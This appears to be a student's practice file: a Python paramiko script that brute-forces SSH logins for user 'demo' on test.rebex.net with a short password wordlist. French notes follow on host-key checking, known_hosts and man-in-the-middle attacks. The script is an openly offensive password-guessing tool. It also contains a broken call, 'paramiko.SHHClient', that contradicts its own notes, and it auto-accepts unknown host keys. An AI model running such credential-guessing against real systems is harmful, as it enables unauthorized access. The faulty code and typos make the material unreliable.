import paramiko

host = "test.rebex.net"
port = 22
username = "demo"
wordlist = ["password", "1223345", "password123"]

def try_ssh_login(host, port, user, password):
    client = paramiko.SHHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password, timeout=3)
        print(f"Ok, {user}:{password}")
        client.close()
        return True 
    except Exception as e:
        print(e) 
    return False

for password in wordlist:
    if try_ssh_login(host, port, username, password):
        break


"""
Les points importants ici : 
-client = paramiko.SSHClient() -> cette partie permet de créer un objet client SSH avec paramiko. 
Elle gère de ce fait la logique du protocole SSH (donc connexion TCP, handshake,
chiffrement etc etc...). Il pourrait être intéressant de voir comment faire ça en C

-client.set_missing_host_key_policy(pramiko.AutoAddPolicy()) -> cette ligne permet une meilleure 
compréhension du processus SSH. En effet, dans un CTF, une fois les credentials obtenus, nous nous connectons
en SSH avec la commande ssh nom_user@adresse_IP. En utiisant cette commande, le client va comparer la clé publique 
du serveur avec ce qu'il y a dans le fichier /.ssh/known_hosts. Or, si c'est la première fois, nous verrons le message : 
The authenticity of host 'example.com' can't be established.
RSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no)?

L'avantage de cela est d'éviter une attaque type Man In the Middle. 
Pourquoi et comment ? Il faut comprendre deux étapes : 
1) Une connexion SSH marche (de façon simplifiée) de la façon suivante : 
-tu tentes de te connecter en SSH
-le serveur envoie sa clé publique au client. 
-le client utilise cette clé pour établir un canal chiffré. Or, si cette clé est déjà enregistré dans /.ssh/known_hosts, 
le client sera sûr de parler au bon serveur. 

2) Man In the Middle. 
-Supposons qu'un attaquant intercepte notre connexion SSH. Il peut : 
-se faire passer pour un serveur légitime et t'envoyer sa propre clé publique
-si la clé n'appartient pas au folder /.ssh/known_hosts, le client n'aura aucune certitude. Comme c'est la première fois qu'il 
voit cette clé, il ne peut pas savoir si elle est légitime et provient de la bonne personne. 
-si nous acceptions sans vérification, nous nous connectons à l'attaquant. 

C'est donc la raison de la protection pour ssh. 

Par défaut, Paramiko fait la même chose. Si la clé du serveur n'est pas déjà connue, il refuse la connexion. 
Notre code permet ainsi d'ajouter automatiquent la clé du serveur si elle est inconnue (in fine, c'est comme si
nous mettons "yes"). Comme nous nous mettons dans la peau d'un attaquant, nous pouvons accepter le risque. 
"""